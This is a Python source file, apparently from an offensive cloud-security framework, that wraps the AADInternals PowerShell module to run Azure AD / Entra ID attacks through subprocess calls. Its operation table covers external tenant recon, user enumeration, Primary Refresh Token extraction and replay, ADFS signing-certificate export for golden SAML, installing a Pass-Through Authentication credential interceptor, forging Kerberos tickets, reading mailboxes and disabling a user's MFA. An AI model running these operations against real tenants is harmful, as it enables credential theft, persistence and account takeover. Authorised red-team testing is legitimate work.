"""AADInternals bridge for Azure AD / Entra ID exploitation.

Source: https://github.com/Gerenios/AADInternals
License: MIT
SRC-ID: SRC-1038
Category: Azure AD, Entra ID, identity exploitation, token abuse, ADFS,
          golden SAML, PRT, PTA, kill chain, M365 lateral movement

AADInternals (v0.9.8, Dr Nestori Syynimaa / Gerenios) is a PowerShell
module that exposes internal Azure AD, Entra ID, and Office 365 APIs for
offensive operations. This bridge wraps the PowerShell module via ``pwsh``
subprocess calls, parsing JSON output back into Python structures.

Supported operation categories:
  recon        Invoke-AADIntReconAsOutsider (tenant enumeration)
  enum         Get-AADIntUsers, Get-AADIntTenantDetails, domain listing
  token_ops    Access token acquisition for various Azure resource APIs
  adfs_export  ADFS signing certificate export (golden SAML prerequisite)
  killchain    Invoke-AADIntReconAsOutsider + automated kill chain steps
  prt_ops      Primary Refresh Token extraction and replay
  pta_exploit  Pass-Through Authentication agent abuse
  kerberos     Cloud Kerberos trust ticket forging
  graph_abuse  MS Graph API abuse (app consent, mail read, etc.)
  mfa_bypass   MFA setting manipulation and bypass
"""

import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime, UTC
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.azure.aadinternals_bridge.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["network", "credential_access", "token_manipulation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1078.004", "T1552", "T1558", "T1606.002", "T1550.001"],
    "source": "https://github.com/Gerenios/AADInternals",
    "license": "MIT",
}

# Maps operation names to AADInternals cmdlets and their required parameters.
_OPS: dict[str, dict[str, Any]] = {
    "recon": {
        "cmdlet": "Invoke-AADIntReconAsOutsider",
        "params": {"DomainName": "target_domain"},
        "description": "External tenant reconnaissance without credentials",
    },
    "enum_users": {
        "cmdlet": "Get-AADIntUsers",
        "params": {"AccessToken": "access_token"},
        "description": "Enumerate all users via internal admin API",
    },
    "tenant_details": {
        "cmdlet": "Get-AADIntTenantDetails",
        "params": {"AccessToken": "access_token"},
        "description": "Retrieve tenant configuration details",
    },
    "token_aad_graph": {
        "cmdlet": "Get-AADIntAccessTokenForAADGraph",
        "params": {},
        "description": "Acquire access token for AAD Graph API (interactive)",
    },
    "token_ms_graph": {
        "cmdlet": "Get-AADIntAccessTokenForMSGraph",
        "params": {},
        "description": "Acquire access token for MS Graph API (interactive)",
    },
    "token_az_core": {
        "cmdlet": "Get-AADIntAccessTokenForAzureCoreManagement",
        "params": {},
        "description": "Acquire access token for Azure Core Management API",
    },
    "adfs_export": {
        "cmdlet": "Export-AADIntADFSSigningCertificate",
        "params": {},
        "description": "Export ADFS token signing certificate (golden SAML)",
    },
    "killchain_recon": {
        "cmdlet": "Invoke-AADIntReconAsOutsider",
        "params": {"DomainName": "target_domain"},
        "description": "Kill chain phase 1: external reconnaissance",
    },
    "killchain_enum": {
        "cmdlet": "Invoke-AADIntUserEnumerationAsOutsider",
        "params": {"UserName": "username_file"},
        "description": "Kill chain phase 2: user enumeration without auth",
    },
    "prt_extract": {
        "cmdlet": "Get-AADIntUserPRTToken",
        "params": {},
        "description": "Extract Primary Refresh Token from current session",
    },
    "prt_to_access": {
        "cmdlet": "Get-AADIntAccessTokenForAADGraph",
        "params": {"PRTToken": "prt_token"},
        "description": "Convert PRT to access token for AAD Graph",
    },
    "pta_backdoor": {
        "cmdlet": "Install-AADIntPTASpy",
        "params": {},
        "description": "Install PTA agent credential interceptor",
    },
    "kerberos_ticket": {
        "cmdlet": "New-AADIntKerberosTicket",
        "params": {"SidString": "user_sid"},
        "description": "Forge cloud Kerberos trust ticket",
    },
    "graph_apps": {
        "cmdlet": "Get-AADIntServicePrincipals",
        "params": {"AccessToken": "access_token"},
        "description": "Enumerate service principals via Graph API",
    },
    "graph_mail": {
        "cmdlet": "Get-AADIntOutlookMessages",
        "params": {"AccessToken": "access_token", "User": "target_user"},
        "description": "Read mailbox via Outlook REST API",
    },
    "mfa_status": {
        "cmdlet": "Get-AADIntMFAStatus",
        "params": {"AccessToken": "access_token"},
        "description": "Retrieve MFA enforcement status for all users",
    },
    "mfa_disable": {
        "cmdlet": "Set-AADIntUserMFA",
        "params": {"AccessToken": "access_token", "UserPrincipalName": "target_user", "State": "Disabled"},
        "description": "Disable MFA for a target user",
    },
}

_MODULE_NAME = "AADInternals"


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _find_pwsh() -> str | None:
    """Locate PowerShell Core binary."""
    for name in ("pwsh", "pwsh-preview"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _check_module(pwsh: str) -> bool:
    """Verify that AADInternals module is importable."""
    cmd = [pwsh, "-NoProfile", "-NonInteractive", "-Command",
           f"if (Get-Module -ListAvailable -Name {_MODULE_NAME}) {{ 'OK' }} else {{ 'MISSING' }}"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return "OK" in result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False


def _run_cmdlet(pwsh: str, cmdlet: str, params: dict[str, str],
                timeout: int = 120) -> dict[str, Any]:
    """Execute an AADInternals cmdlet and return parsed JSON output.

    Constructs a PowerShell pipeline that imports the module, invokes the
    cmdlet with the given parameters, and converts output to JSON for
    cross-language consumption.
    """
    param_str = ""
    for k, v in params.items():
        # Escape single quotes in values
        safe_v = str(v).replace("'", "''")
        param_str += f" -{k} '{safe_v}'"

    ps_script = (
        f"Import-Module {_MODULE_NAME} -ErrorAction Stop; "
        f"$result = {cmdlet}{param_str}; "
        f"$result | ConvertTo-Json -Depth 10 -Compress"
    )

    cmd = [pwsh, "-NoProfile", "-NonInteractive", "-Command", ps_script]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"status": "timeout", "cmdlet": cmdlet, "error": f"Timed out after {timeout}s"}

    output: dict[str, Any] = {
        "cmdlet": cmdlet,
        "exit_code": proc.returncode,
        "stderr": proc.stderr.strip() if proc.stderr else "",
    }

    if proc.returncode != 0:
        output["status"] = "error"
        output["error"] = proc.stderr.strip() or "Non-zero exit code"
        return output

    # Parse JSON output from PowerShell
    stdout = proc.stdout.strip()
    if not stdout:
        output["status"] = "completed"
        output["data"] = None
        return output

    try:
        output["data"] = json.loads(stdout)
        output["status"] = "completed"
    except json.JSONDecodeError:
        # Some cmdlets produce non-JSON text output
        output["data"] = stdout
        output["status"] = "completed"
        output["format"] = "text"

    return output


def _resolve_params(op_def: dict[str, Any], args: Any) -> dict[str, str]:
    """Map operation parameter definitions to actual values from args."""
    resolved = {}
    for ps_param, arg_name in op_def.get("params", {}).items():
        val = getattr(args, arg_name, None)
        if val is not None:
            resolved[ps_param] = str(val)
        elif isinstance(arg_name, str) and not arg_name.startswith("_"):
            # Check if it is a literal default value (e.g. "Disabled")
            if arg_name[0].isupper() or arg_name in ("true", "false"):
                resolved[ps_param] = arg_name
    return resolved


def list_operations() -> list[dict[str, str]]:
    """Return available AADInternals operations and descriptions."""
    return [
        {"name": name, "description": op["description"], "cmdlet": op["cmdlet"]}
        for name, op in _OPS.items()
    ]


def run(args: Any) -> int:
    """Execute aadinternals_bridge module.

    Expects args to contain:
      - operation (str): one of the keys in _OPS
      - target_domain (str, optional): target Entra ID domain
      - access_token (str, optional): pre-acquired access token
      - target_user (str, optional): user principal name for targeted ops
      - prt_token (str, optional): PRT for token conversion
      - user_sid (str, optional): SID for Kerberos ticket forging
      - username_file (str, optional): file with usernames for enumeration
      - output (str): output directory
      - timeout (int, optional): cmdlet timeout in seconds
    """
    provider = getattr(args, "command", "azure")
    print(f"[*] {MANIFEST['capability_id']}  -  AADInternals bridge for Entra ID exploitation")
    print(f"[*] Provider: {provider} | Tool: AADInternals (PowerShell)")

    results: dict[str, Any] = {
        "module": "aadinternals_bridge",
        "provider": provider,
        "findings": [],
        "summary": {},
    }

    # Step 1: Locate PowerShell Core
    pwsh = _find_pwsh()
    if not pwsh:
        print("[!] PowerShell Core (pwsh) not found in PATH", file=sys.stderr)
        print("[*] Install: https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell")
        results["status"] = "missing_dependency"
        results["error"] = "pwsh not found"
        _save(args, "azure_aadinternals", results)
        return 1

    print(f"[*] PowerShell Core: {pwsh}")

    # Step 2: Check module availability
    if not _check_module(pwsh):
        print(f"[!] Module {_MODULE_NAME} not installed", file=sys.stderr)
        print("[*] Install: Install-Module AADInternals -Scope CurrentUser")
        results["status"] = "missing_dependency"
        results["error"] = f"{_MODULE_NAME} module not available"
        _save(args, "azure_aadinternals", results)
        return 1

    print(f"[+] Module {_MODULE_NAME} available")

    # Step 3: Determine operation
    operation = getattr(args, "operation", "recon")
    if operation not in _OPS:
        print(f"[!] Unknown operation: {operation}", file=sys.stderr)
        print(f"[*] Available: {', '.join(_OPS.keys())}")
        results["status"] = "invalid_operation"
        results["error"] = f"Unknown operation: {operation}"
        _save(args, "azure_aadinternals", results)
        return 1

    op_def = _OPS[operation]
    print(f"[*] Operation: {operation} ({op_def['description']})")
    print(f"[*] Cmdlet: {op_def['cmdlet']}")

    # Step 4: Resolve parameters
    params = _resolve_params(op_def, args)
    timeout = getattr(args, "timeout", 120)

    # Validate required params that must come from args
    for ps_param, arg_name in op_def.get("params", {}).items():
        if ps_param not in params and not (arg_name[0].isupper() or arg_name in ("true", "false")):
            print(f"[!] Missing required parameter: {arg_name} (for -{ps_param})", file=sys.stderr)
            results["status"] = "missing_parameter"
            results["error"] = f"Parameter {arg_name} required for {operation}"
            _save(args, "azure_aadinternals", results)
            return 1

    # Step 5: Execute
    print(f"[*] Executing {op_def['cmdlet']} with {len(params)} parameters...")
    cmdlet_result = _run_cmdlet(pwsh, op_def["cmdlet"], params, timeout=timeout)

    if cmdlet_result.get("status") == "error":
        print(f"[-] Cmdlet failed: {cmdlet_result.get('error', 'unknown')}", file=sys.stderr)
        results["status"] = "error"
        results["error"] = cmdlet_result.get("error")
        results["cmdlet_output"] = cmdlet_result
        _save(args, "azure_aadinternals", results)
        return 1

    if cmdlet_result.get("status") == "timeout":
        print(f"[-] Cmdlet timed out after {timeout}s", file=sys.stderr)
        results["status"] = "timeout"
        results["error"] = cmdlet_result.get("error")
        _save(args, "azure_aadinternals", results)
        return 1

    # Step 6: Process results
    data = cmdlet_result.get("data")
    finding_count = 0
    if isinstance(data, list):
        finding_count = len(data)
        for item in data:
            results["findings"].append({
                "type": operation,
                "data": item,
            })
    elif isinstance(data, dict):
        finding_count = 1
        results["findings"].append({
            "type": operation,
            "data": data,
        })
    elif data is not None:
        finding_count = 1
        results["findings"].append({
            "type": operation,
            "data": str(data),
        })

    results["status"] = "completed"
    results["summary"] = {
        "operation": operation,
        "cmdlet": op_def["cmdlet"],
        "items_returned": finding_count,
        "key_finding": f"{finding_count} results from {operation}",
    }

    print(f"[+] Operation complete: {finding_count} items returned")
    _save(args, "azure_aadinternals", results)
    return 0
